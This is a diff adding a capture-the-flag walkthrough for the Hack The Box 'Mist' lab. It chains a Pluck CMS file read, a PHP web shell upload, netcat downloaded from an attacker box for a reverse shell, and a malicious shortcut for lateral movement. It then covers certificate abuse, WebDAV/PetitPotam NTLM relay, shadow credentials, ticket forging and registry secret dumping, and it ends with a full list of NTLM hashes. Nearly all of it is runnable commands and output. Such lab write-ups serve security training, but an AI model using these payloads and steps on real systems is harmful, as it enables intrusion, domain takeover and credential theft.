@@ -1,0 +1,182 @@
+# user
+## Pluck CMS 4.7.18
+## we found password here
+curl 'http://mist.htb/data/modules/albums/albums_getimage.php?image=admin_backup.php'
+<?php
+$ww = 'c81dde783f9543114ecd9fa14e8440a2a868bfe0bacdf14d29fce0605c09d5a2bcd2028d0d7a3fa805573d074faa15d6361f44aec9a6efe18b754b3c265ce81e';
+?>146
+
+## pass it to crackstation.net
+lexypoo97
+## we can now login to the CMS
+## get a reverse shell by uploading a new module in http://mist.htb/admin.php?action=installmodule
+## first create a sh.php and zip it
+sh.php
+```
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+</html>
+```
+zip -r new.zip sh.php
+## now upload new.zip and visit
+http://mist.htb/data/modules/new/sh.php?cmd=whoami
+ms01\svc_web
+## get a reverse shell by uploading netcat
+....?cmd=powershell.exe -c curl YOUR_BOX_IP/nc64.exe -o \xampp\htdocs\files\nc64.exe
+## after it got uploaded
+....?cmd=cmd.exe /c \xampp\htdocs\files\nc64.exe YOUR_BOX_IP PORT -e powershell.exe
+
+## to get to Brandon.Keywarp user we can make a shortcut file that execute our program
+## in windows create a mist.bat then save it to C:\ProgramData\mist.bat
+mist.bat
+```
+cmd.exe /c \xampp\htdocs\files\nc64.exe YOUR_BOX_IP PORT -e powershell.exe
+```
+right click, New, shortcut, select your mist.bat
+## then upload the mist.lnk to C:\Common Applications
+cd C:\"Common Applications"
+curl YOUR_BOX_IP/mist.lnk -o Notepad.lnk
+## and you'll get Brandon.Keywarp shell
+
+## getting Brandon.Keywarp ntlm hash
+## upload certify.exe and rubeus.exe to the box
+.\certify.exe request /ca:DC01.mist.htb\mist-DC01-CA /currentuser
+## save the private key and certificate to cert.pem and convert it to pfx
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+## and get brandon.keywarp ntlm hash
+.\rubeus.exe asktgt /getcredentials /user:Brandon.Keywarp /certificate:cert.pfx /d:mist.htb /dc:dc01.mist.htb /show
+DB03D6A77A2205BC1D07082740626CC9
+
+## Webdav coerce
+## setup webdav in your machine, for example using apache2
+https://gist.github.com/KINGSABRI/e20693b9a1035df7b9d213ce49d004ca
+'''
+DavLockDB /var/www/DavLock
+
+<VirtualHost *:80>
+        # WebDav Configurations
+        Alias / /var/www/webdav
+        <Directory /var/www/webdav>
+                DAV On
+                Options Indexes MultiViews
+                AllowOverride None
+        </Directory>
+
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+'''
+## confirm if you can connect to it with cadaver and no error pops up
+cadaver http://localhost/
+
+## use chisel to start a proxy MS01
+.\chisel.exe client 10.10.YY.YY:9999 R:socks
+## and 
+.\chisel.exe client 10.10.YY.YY:4444 8080:10.10.YY.YY:8080
+
+# attacker
+chisel server -p 9999 --reverse
+chisel server -p 4444 --reverse
+socat tcp-listen:8080,reuseaddr,fork tcp:10.10.YY.YY:80
+
+## start webdav in MS01
+net use n: http://attacker_ip/
+
+## confirm if webdav is on
+proxychains cme smb 192.168.100.101 -u 'Brandon.Keywarp' -H DB03D6A77A2205BC1D07082740626CC9 -M webdav
+WEBDAV      192.168.100.101 445    MS01             WebClient Service enabled on: 192.168.100.101
+
+## stop the webdav service so port 80 will be available for ntlmrelay
+## start ntlmrelayx, apply this patch https://github.com/fortra/impacket/pull/1402
+proxychains ntlmrelayx.py -t ldaps://192.168.100.100 --delegate-access -i
+
+# https://github.com/topotam/PetitPotam
+proxychains python3 PetitPotam.py -u Brandon.Keywarp -d mist.htb -hashes :DB03D6A77A2205BC1D07082740626CC9 "ms01@8080/test" 192.168.100.101 -pipe all
+## after you get an output in ntlmrelayx
+[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000
+## connect to port 11000 on localhost
+$ nc localhost 11000
+
+"""
+# clear_shadow_creds MS01$
+Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb
+Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108
+
+Shadow credentials cleared successfully!
+
+# set_shadow_creds MS01$
+Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb
+Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108
+
+KeyCredential generated with DeviceID: 75246ae0-2cb5-632c-8097-ef88077ca8c9
+Shadow credentials successfully added!
+Saved PFX (#PKCS12) certificate & key at path: nRqSFIzD.pfx
+Must be used with password: XcmAdLYcfX0U5zZCCsEF
+"""
+
+<https://github.com/dirkjanm/PKINITtools>
+$ proxychains python3 gettgtpkinit.py -cert-pfx nRqSFIzD.pfx -pfx-pass 'XcmAdLYcfX0U5zZCCsEF' -dc-ip 192.168.100.100 'mist.htb/ms01$' tickhet.ccache
+$ export KRB5CCNAME=tickhet.ccache
+$ proxychains python getnthash.py 'mist.htb/ms01$' -key <key from gettgtpkinit.py>
+4a74fc05400345d580cf58aec3e6d833
+
+$ ticketer.py -nthash 4a74fc05400345d580cf58aec3e6d833 -domain-sid S-1-5-21-1045809509-3006658589-2426055941 -domain mist.htb -dc-ip 192.168.100.100 -spn HOST/MS01.mist.htb administrator
+$ export KRB5CCNAME=administrator.ccache
+
+$ proxychains nxc smb 192.168.100.101 --use-kcache --sam
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:711e6a685af1c31c4029c3c7681dd97b:::
+
+# user flag
+$ proxychains evil-winrm -i 192.168.100.101 -u administrator -H 711e6a685af1c31c4029c3c7681dd97b
+
+# root
+## setup chisel socks proxy
+$ proxychains certipy req -u 'svc_cabackup@mist.htb' -hashes :c9872f1bc10bdd522c12fc2ac9041b64 -dns-tcp -dc-ip 192.168.100.100 -template 'ManagerAuthentication' -ca 'mist-DC01-CA' -key-size 4096
+$ certipy auth -pfx svc_cabackup.pfx -domain mist.htb -dns-tcp -dc-ip 192.168.100.100
+$ export KRB5CCNAME=svc_cabackup.ccache
+$ certipy req -u 'svc_cabackup@mist.htb' -k -no-pass -dns-tcp -dc-ip dc01.mist.htb -target dc01.mist.htb -ns 192.168.100.100 -template 'BackupSvcAuthentication' -ca 'mist-DC01-CA' -key-size 4096
+$ certipy auth -pfx svc_cabackup.pfx -domain mist.htb -dns-tcp -dc-ip 192.168.100.100
+$ export KRB5CCNAME=svc_cabackup.ccache
+
+# start smbserver
+$ smbserver.py -smb2support share .
+# dump registry
+$ proxychains impacket-reg.py 'mist.htb/svc_cabackup@dc01.mist.htb' -k -no-pass -dc-ip 192.168.100.100 backup -o '\\10.10.YY.YY\share\'
+$ secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+$ proxychains evil-winrm -i 192.168.100.100 -u administrator -H b46782b9365344abdff1a925601e0385
+
+## SAM Database
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:b46782b9365344abdff1a925601e0385:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:298fe98ac9ccf7bd9e91a69b8c02e86f:::
+Sharon.Mullard:1109:aad3b435b51404eeaad3b435b51404ee:1f806175e243ed95db55c7f65edbe0a0:::
+Brandon.Keywarp:1110:aad3b435b51404eeaad3b435b51404ee:db03d6a77a2205bc1d07082740626cc9:::
+Florence.Brown:1111:aad3b435b51404eeaad3b435b51404ee:9ee69a8347d91465627365c41214edd6:::
+Jonathan.Clinton:1112:aad3b435b51404eeaad3b435b51404ee:165fbae679924fc539385923aa16e26b:::
+Markus.Roheb:1113:aad3b435b51404eeaad3b435b51404ee:74f1d3e2e40af8e3c2837ba96cc9313f:::
+Shivangi.Sumpta:1114:aad3b435b51404eeaad3b435b51404ee:4847f5daf1f995f14c262a1afce61230:::
+Harry.Beaucorn:1115:aad3b435b51404eeaad3b435b51404ee:a3188ac61d66708a2bd798fa4acca959:::
+op_Sharon.Mullard:1122:aad3b435b51404eeaad3b435b51404ee:d25863965a29b64af7959c3d19588dd7:::
+op_Markus.Roheb:1123:aad3b435b51404eeaad3b435b51404ee:73e3be0e5508d1ffc3eb57d48b7b8a92:::
+svc_smb:1125:aad3b435b51404eeaad3b435b51404ee:1921d81fdbc829e0a176cb4891467185:::
+svc_cabackup:1135:aad3b435b51404eeaad3b435b51404ee:c9872f1bc10bdd522c12fc2ac9041b64:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e768c4cf883a87ba9e96278990292260:::
+MS01$:1108:aad3b435b51404eeaad3b435b51404ee:4a74fc05400345d580cf58aec3e6d833:::
+svc_ca$:1124:aad3b435b51404eeaad3b435b51404ee:34956e4924985c2f1b7ba808cd54bcb8:::
